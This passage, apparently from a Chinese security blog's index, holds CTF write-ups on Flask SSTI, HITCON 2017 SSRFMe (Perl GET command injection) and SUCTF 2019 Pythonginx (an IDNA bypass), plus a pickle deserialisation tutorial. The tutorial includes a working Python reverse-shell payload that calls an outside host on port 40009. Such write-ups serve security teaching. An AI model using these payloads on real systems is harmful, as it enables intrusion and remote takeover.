class="string">"http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']&#125;&#125;"</span></span></span><br><span class="line">TWCTF&#123;pray_f0r_sacred_jinja2&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017HITCON-CTF-SSRFMe</title>
      <link href="/2019/09/25/2017HITCON-CTF-SSRFMe/"/>
      <url>/2019/09/25/2017HITCON-CTF-SSRFMe/</url>
      
        <content type="html"><![CDATA[<h1 id="2017HITCON-CTF-SSRFMe"><a href="#2017HITCON-CTF-SSRFMe" class="headerlink" title="2017HITCON-CTF-SSRFMe"></a>2017HITCON-CTF-SSRFMe</h1><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>​        拿到题意直接给出了源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $sandbox = <span class="string">"sandbox/sandbox"</span>; </span><br><span class="line">    @mkdir($sandbox); </span><br><span class="line">    @chdir($sandbox); </span><br><span class="line"></span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>])); </span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]); </span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>])); </span><br><span class="line">    @mkdir($dir); </span><br><span class="line">    @chdir($dir); </span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data); </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>审计分析源码过程大致如下：</p><ul><li>进入<code>./sandbox/sandbox</code>目录</li><li>执行GET命令，GET的内容可控</li><li>将内容写入<code>./sandbox/sandbox/filename</code></li><li>最终直接访问<code>./sandbox/sandbox/filename</code>可以获取到GET执行获得的内容</li></ul><h2 id="GET初利用"><a href="#GET初利用" class="headerlink" title="GET初利用"></a>GET初利用</h2><p>​        首先利用SSRF我们可以传入<code>url=file:///&amp;filename=456</code>获得根目录的文件路径列表，访问<code>/sandbox/sandbox/456</code> 发现readflag和flag</p><p><img src="2017HITCON-CTF-SSRFMe/1.png" alt=""></p><p>​        可是当我们想读取flag和readflag的时候，发现flag无法直接读取出来，readflag读取并下载出来发现ELF文件头，是一个可执行文件，猜测需要执行readflag这个文件才能获得flag。（猜测这个文件本身有可执行权限）</p><p>​        于是我们需要执行命令运行这个可执行文件。</p><h2 id="GET执行任意命令"><a href="#GET执行任意命令" class="headerlink" title="GET执行任意命令"></a>GET执行任意命令</h2><p>​        这里利用的是比较早就被爆出来的一个问题。这里的原理涉及到代码的底层实现，不过多深究，来自LoRexxar师傅的文章：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@iZ285ei82c1Z:~&#x2F;test# cat a.pl </span><br><span class="line">open(FD, &quot;|id&quot;);</span><br><span class="line">print &lt;FD&gt;;</span><br><span class="line">root@iZ285ei82c1Z:~&#x2F;test# perl a.pl </span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><p>而perl里的GET函数底层就是调用了open处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file.pm</span><br><span class="line">84: opendir(D, $path) or</span><br><span class="line">132:    open(F, $path) or return new</span><br></pre></td></tr></table></figure><p>open函数本身还支持file协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@iZ285ei82c1Z:~&#x2F;test# cat &#x2F;usr&#x2F;share&#x2F;perl5&#x2F;LWP.pm</span><br><span class="line">...</span><br><span class="line">&#x3D;head2 File Request</span><br><span class="line">The library supports GET and HEAD methods for file requests.  The</span><br><span class="line">&quot;If-Modified-Since&quot; header is supported.  All other headers are</span><br><span class="line">ignored.  The I&lt;host&gt; component of the file URL must be empty or set</span><br><span class="line">to &quot;localhost&quot;.  Any other I&lt;host&gt; value will be treated as an error.</span><br><span class="line">Directories are always converted to an HTML document.  For normal</span><br><span class="line">files, the &quot;Content-Type&quot; and &quot;Content-Encoding&quot; in the response are</span><br><span class="line">guessed based on the file suffix.</span><br><span class="line">Example:</span><br><span class="line">  $req &#x3D; HTTP::Request-&gt;new(GET &#x3D;&gt; &#39;file:&#x2F;etc&#x2F;passwd&#39;);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>综合看起来是把一个文件名拼接入命令导致的命令执行。</p><p>（同理，我们对GET命令而言，通过传入命令文件名和命令来执行）</p><p><strong>这里补充一点</strong></p><p>​        perl在open中可以执行命令，格式有两种：</p><blockquote><p><code>open(FD, &quot;ls|&quot;)或open(FD, &quot;|ls&quot;)</code></p></blockquote><p><img src="2017HITCON-CTF-SSRFMe/2.png" alt=""></p><p><strong>利用方式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET file:ls|</span><br><span class="line">GET file:|ls</span><br><span class="line">&#x2F;&#x2F;需要当前目录下存在与命令同名文件</span><br></pre></td></tr></table></figure><p><img src="2017HITCON-CTF-SSRFMe/3.png" alt=""></p><p>这里我在kali虚拟机里测试了一下，发现只有 <code>file:|id</code>有效。但是参考网上wp，其中都是采用的 <code>file:id|</code>的方式</p><p>于是我又在vps上测试了一下</p><p><img src="2017HITCON-CTF-SSRFMe/4.png" alt=""></p><p>可以发现在vps下两种方式都是可行的，这里可能跟perl版本有关，具体原因有点迷。那么我们对题目进行测试的话两种都试一下。</p><h2 id="Linux-执行文件"><a href="#Linux-执行文件" class="headerlink" title="Linux 执行文件"></a>Linux 执行文件</h2><p>​        首先必须要知道，对于一个可执行文件（Linux下具有”x”属性的文件），我们要执行这个文件（换句话来说就好比运行Windows下的exe文件）。</p><p>​        Linux下，如果文件是可执行文件，或者是脚本文件，只要有可执行权限就可以直接执行，操作命令如下：</p><p><strong><code>./filename</code></strong></p><p>在当前路径下对执行filename文件</p><p><strong><code>绝对路径</code></strong></p><p>直接给出可执行文件的绝对路径并回车</p><p>回来看我们的题，我们现在需要做的是执行根目录下的readflag，并且把readflag的内容写入某个文件，最后我们再访问该文件即可得到readflag执行后得到的结果。</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><code>?url=&amp;filename=|/readflag</code>   创建与命令同名文件</p><p><code>?url=file:|/readflag&amp;filename=123</code>    执行命令</p><p><code>/sandbox/sandbox/123</code>     访问执行结果</p><p>同时也试了另外一种（管道符在右边），并没有读出结果。看了网上的大多数复现，发现都是采用的管道符在右边这种形式，并且是以<code>bash -c  {命令}</code>整体作为命令执行的</p><p>来自网上提供的解：</p><p><code>/?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code> 创建相应的同名文件<br><code>/?url=file:bash -c /readflag|&amp;filename=123</code> 利用open的feature执行代码<br>最后直接访问<strong>/sandbox/sandbox/123</strong>就能得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GET命令执行 </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019SUCTF-Pythonginx</title>
      <link href="/2019/09/25/2019SUCTF-Pythonginx/"/>
      <url>/2019/09/25/2019SUCTF-Pythonginx/</url>
      
        <content type="html"><![CDATA[<h1 id="2019SUCTF-Pythonginx"><a href="#2019SUCTF-Pythonginx" class="headerlink" title="2019SUCTF-Pythonginx"></a>2019SUCTF-Pythonginx</h1><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>​        拿到题发现页面有一个简单的路由的源码，除此之外尝试了扫路径抓包等操作没有格外信息，那么就仔细来研究一下这段代码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br><span class="line"></span><br><span class="line">&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure><p>​        可以发现在line：19 存在一个urlopen().read()函数。那么题意应该就是绕过前面的限制最后执行读取一个文件内容。传入的url我们可以利用file协议把flag包含进来。这里提到了让我们不用担心suctf.cc，应该是将suctf.cc解析到了容器本机。</p><h2 id="如何绕过？"><a href="#如何绕过？" class="headerlink" title="如何绕过？"></a>如何绕过？</h2><p>​        首先我们需要知道这一段代码的处理效果，对urlparse一系列的函数的效果不是很清晰，于是把代码每一个参数都输出看看效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit, urlunsplit, unquote</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"file://suctf.c/usr/nginx"</span></span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    print(<span class="string">'host:'</span>+host)</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    print(<span class="string">'parts:'</span>+str(parts))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    print(<span class="string">'host:'</span>+host)</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    print(<span class="string">'host.split:'</span>+str(host.split(<span class="string">'.'</span>)))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    print(<span class="string">'newhost[]:'</span>+str(newhost))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    print(<span class="string">'parts[1]:'</span>+parts[<span class="number">1</span>])</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    print(<span class="string">'finalUrl:'</span>+finalUrl)</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    print(<span class="string">'host:'</span>+host)</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(getUrl())</span><br></pre></td></tr></table></figure><p><img src="2019SUCTF-Pythonginx/2.png" alt="">s</p><p>​        即我们需要绕过前面2次的对host的判断，同时第三次满足host=’suctf.cc’</p><p><strong>分析过程：</strong></p><p>首先来看第一个suctf.cc，假设我们通过某种途径让它绕过了此条限制，那么在第二个suctf.cc限制到来之前，经过parts = list(urlsplit(url))，最后又取出parts[1]，那么这里很明显只是分割又取出来的一个过程应该不存在漏洞，对urlsplit而言，专门去查一下是否存在漏洞？于是乎发现……</p><p><img src="2019SUCTF-Pythonginx/3.png" alt=""></p><p>直接把出题思路给搜出来了….好叭，思路是这样，总之没查出关于urlsplit的漏洞。那么我们继续分析</p><p>经过第二个suctf.cc后对host进行了分割，比如suctf.ca 那么就把suctf.ca分割成sucef和ca</p><p>将这两部分进行一个encode-decode过程：<code>h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)</code></p><p>最后又拼接起来，替换了原来了host，再进行去除空格操作，最后又将完整的url解析出host字段，此时进行第三次判断。</p><p><strong>捋一下思路：</strong></p><ul><li><p>假设我们绕过前两次判断，那么第三次是必须要让host=’suctf.cc’才能去读取flag的</p></li><li><p>那么就变成了这么一个意思：我们输入的url，在前两次都不等于suctf，第三次的时候变成了suctf.cc。</p></li><li>第三次前做了什么操作？<ul><li>host取出，以<code>.</code>分割</li><li>对两部分内容进行<code>h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)</code></li><li>最后又替换了原来的url中的host部分。</li></ul></li></ul><p>这样一来就很明朗了，我们传入的url的host在经过<code>h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)</code>函数前不为’suctf’，处理后变成了’suctf’，查一下关于这个漏洞</p><p>会发现这是一个来自2019blackhat的议题——<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">传送门</a></p><p><img src="2019SUCTF-Pythonginx/1.png" alt=""></p><p><code>℆经过idna编码再用utf-8解码会变成c/u,同理还有很多可以利用的字符来实现对url一些字符的绕过</code></p><h2 id="Fuzz脚本"><a href="#Fuzz脚本" class="headerlink" title="Fuzz脚本"></a>Fuzz脚本</h2><p>随手网上搜索到的一个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65537</span>):</span><br><span class="line">    tmp=chr(i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = tmp.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"-"</span>) <span class="keyword">in</span> res:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        print(<span class="string">"U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; "</span>.format(tmp, res, i))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><img src="2019SUCTF-Pythonginx/4.png" alt=""></p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>题目给出了环境提示Nginx，Nginx安装完的默认配置文件路径：/usr/local/nginx/conf/nginx.conf</p><p>从中随便挑一个可替换suctf.cc中的字符复制过去如：</p><p><code>?url=file://suctf.cℂ/usr/local/nginx/conf/nginx.conf</code>  读取配置信息得到flag路径</p><p><img src="2019SUCTF-Pythonginx/5.png" alt=""></p><p><code>?url=file://suctf.cℂ/usr/fffffflag</code></p><p><img src="2019SUCTF-Pythonginx/6.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> idna绕过 </tag>
            
            <tag> urllib </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python反序列化之pickle</title>
      <link href="/2019/09/23/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bpickle/"/>
      <url>/2019/09/23/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bpickle/</url>
      
        <content type="html"><![CDATA[<h1 id="python反序列化之pickle"><a href="#python反序列化之pickle" class="headerlink" title="python反序列化之pickle"></a>python反序列化之pickle</h1><h2 id="python反序列化"><a href="#python反序列化" class="headerlink" title="python反序列化"></a>python反序列化</h2><p>​        <strong>首先要提到什么是反序列化？</strong></p><p>​        序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。</p><p>​        <strong>简单来说</strong></p><p>​        python数据转化成字符串——-序列化</p><p>​        字符串转化成python数据——-反序列化</p><p><strong>序列化的几种形式</strong></p><ul><li><p><strong>json模块</strong>——json所有的语言都通用，它能序列化的数据是有限的：字典列表和元组</p></li><li><p><strong>pickle模块</strong>——是python特有的，只有python能理解；所有的python中的数据类型都可以转化成字符串形式；且部分反序列化依赖代码</p></li><li><strong>shelve</strong>——序列化句柄；使用句柄直接操作非常方便</li></ul><h2 id="pickle介绍"><a href="#pickle介绍" class="headerlink" title="pickle介绍"></a>pickle介绍</h2><p>​        pickle是python语言的一个标准模块，安装python后已包含pickle库，不需要单独再安装。</p><p>​        pickle模块实现了基本的数据序列化和反序列化。通过pickle模块的序列化操作我们能够将程序中运行的对象信息（直接对内存中的数据操作）保存到文件中去，永久存储；通过pickle模块的反序列化操作，我们能够从文件中创建上一次程序保存的对象。</p><p><strong>序列化操作</strong></p><p>首先看一个实例</p><p><img src="python反序列化之pickle/1.png" alt=""></p><p><img src="python反序列化之pickle/2.png" alt=""></p><p><strong>简而言之</strong></p><p>序列化操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pickle.dump()</span><br></pre></td></tr></table></figure><p>反序列化操作:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pickle.load()</span><br></pre></td></tr></table></figure><p>其中第一次dump将python数据（类）转化成了如下字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ccopy_reg</span><br><span class="line">_reconstructor</span><br><span class="line">p0</span><br><span class="line">(c__main__</span><br><span class="line">Test</span><br><span class="line">p1</span><br><span class="line">c__builtin__</span><br><span class="line">object</span><br><span class="line">p2</span><br><span class="line">Ntp3</span><br><span class="line">Rp4</span><br><span class="line">(dp5</span><br><span class="line">S&#39;var1&#39;</span><br><span class="line">p6</span><br><span class="line">S&#39;This is a test&#39;</span><br><span class="line">p7</span><br><span class="line">sb.</span><br></pre></td></tr></table></figure><p>第二次执行load将字符串转化成了python数据（类）</p><p>​        上面那一堆乱七八糟的字符串是什么？这其实就是序列化后得到的字符串，只是它有它自己特定的表示规则（这是 PVM 虚拟机可以识别的有特殊含义的符号）。如果有了解 PHP 反序列化就能知道这其实大同小异。因为 PHP 也是将类名和对象的属性序列化进去的。</p><p>我们将代码改改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,var1=<span class="string">"This is a test"</span>)</span>:</span></span><br><span class="line">self.var1 = var1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(self)</span>:</span></span><br><span class="line">print(<span class="string">"hello world!"</span>)</span><br><span class="line"></span><br><span class="line">a = Test()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line">c = pickle.loads(b)</span><br><span class="line">c.func1()</span><br></pre></td></tr></table></figure><p><img src="python反序列化之pickle/3.png" alt=""></p><p>可以看到我们反序列化的确得到了一个实例化的类，并且还可以调用其中的函数。</p><p><strong>最后简单解释一下序列化后的格式的规则：</strong>（部分PVM 操作码）</p><p>S : 后面跟的是字符串</p><p>( ：作为命令执行到哪里的一个标记</p><p>t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中</p><p>c ：定义模块名和类名（模块名和类名之间使用回车分隔）</p><p>R ：从栈中取出可调用函数以及元组形式的参数来执行，并把结果放回栈中</p><p>. ：点号是结束符 </p><p><strong>注意：其实并不是所有的对象都能使用 pickle 进行序列化和反序列化，比如说 文件对象和网络套接字对象以及代码对象就不可以</strong>（TypeError: can’t pickle file objects）</p><h2 id="python反序列化漏洞由来"><a href="#python反序列化漏洞由来" class="headerlink" title="python反序列化漏洞由来"></a>python反序列化漏洞由来</h2><p>​        反序列化漏洞是如何产生的？其实很简单，python库诸如pickle只提供序列化和反序列化的操作，但是并不会对传入反序列化函数的内容进行安全检查，如此以来如果能够传入恶意序列化对象，那么在反序列化触发的时候就可能执行恶意指令。</p><p><strong>典型的运用：redis+pickle</strong></p><p>​        典型的一个运用redis未授权访问+python反序列化，这里参考<a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html" target="_blank" rel="noopener">p神的博文</a></p><p>​        由于session是被pickle序列化后存储在服务器端，通过cookie请求sessionid的时候，session中的内容就会被反序列化。利用redis未授权访问可以set重置自己的session，替换成恶意payload即可执行任意命令。</p><h2 id="python反序列化漏洞利用"><a href="#python反序列化漏洞利用" class="headerlink" title="python反序列化漏洞利用"></a>python反序列化漏洞利用</h2><p>​        前面介绍了pickle，这里我也以pickle为例来简单介绍一下如何构造反序列化的payload</p><p>首先补充一个内容<strong>经典类/新式类</strong>   <a href="https://www.cnblogs.com/wujingqiao/p/9668583.html" target="_blank" rel="noopener">参考链接</a></p><p>从上述链接中获知，在python2中我们如果需要利用到<code>__reduce__</code>方法需要采用新式类的形式。</p><p><strong><code>__reduce__</code></strong></p><p>​        当序列化以及反序列化的过程中碰到一无所知的扩展类型( <strong>这里指的就是新式类</strong>)的时候，可以通过类中定义的 <strong>reduce</strong> 方法来告知如何进行序列化或者反序列化</p><p>​        也就是说我们，只要在新式类中定义一个 <strong>reduce</strong> 方法，我们就能在序列化的使用让这个类根据我们在 <strong>reduce</strong>  中指定的方式进行序列化，此时如果我们注入了这个序列化字符串后，在被应用程序自身执行反序列化操作时也会按照<strong>reduce</strong>来执行反序列化，从而实现了反序列化攻击。</p><p>​        那我们该如何指定呢？实际上关键就在这个方法的返回值上，这个方法可以返回两种类型的值，String 和  tuple ,我们的构造点就在令其返回 tuple 的时候。</p><p>​        当他返回值是一个元组的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable  object(可调用的对象)，第二个参数可以是一个元组为这个可调用对象提供必要的参数。</p><p>听着有些抽象，来看一个实例运用（PS：元组中只有单个元素，需要以逗号结尾表名元组类型）</p><p><img src="python反序列化之pickle/4.png" alt=""></p><p>这里就非常明朗了，对于一个应用程序（python），如果它的pickle.loads(a)参数可控，那么就可以实现任意命令执行。（我们可以将命令换成python -c “执行的python代码”,也可以采用<strong>marshal</strong>库来实现，这里不做具体介绍，结尾给出参考链接）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str = <span class="string">"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xxx.xx.xx",40009));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (os.system, (str,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">pickle.loads(a)</span><br></pre></td></tr></table></figure><ul><li>vps监听40009端口</li><li>kali中运行此脚本，vps接收反弹shell</li></ul><p><img src="python反序列化之pickle/5.png" alt=""></p><p><img src="python反序列化之pickle/6.png" alt=""></p><p><strong>题目练习</strong></p><p>来自<a href="https://buuoj.cn/" target="_blank" rel="noopener">BUUCTF</a>收录的<strong>[CISCN2019 华北赛区 Day1 Web2]ikun</strong></p><h2 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h2><ul><li>不要再不守信任的通道中传递 pcikle 序列化对象</li><li>在传递序列化对象前请进行签名或者加密，防止篡改和重播</li><li>如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据</li><li>将 pickle 加载的数据列入白名单</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>更多利用以及原理请参考</p><p><a href="http://www.sohu.com/a/274879579_729271" target="_blank" rel="noopener">一篇文章带你理解漏洞之 Python 反序列化漏洞</a></p><p><a href="https://www.anquanke.com/post/id/86800" target="_blank" rel="noopener">记CTF比赛中发现的Python反序列化漏洞</a></p><p><a href="https://zhuanlan.zhihu.com/p/25981037" target="_blank" rel="noopener">Python Pickle的任意代码执行漏洞实践和Payload构造</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
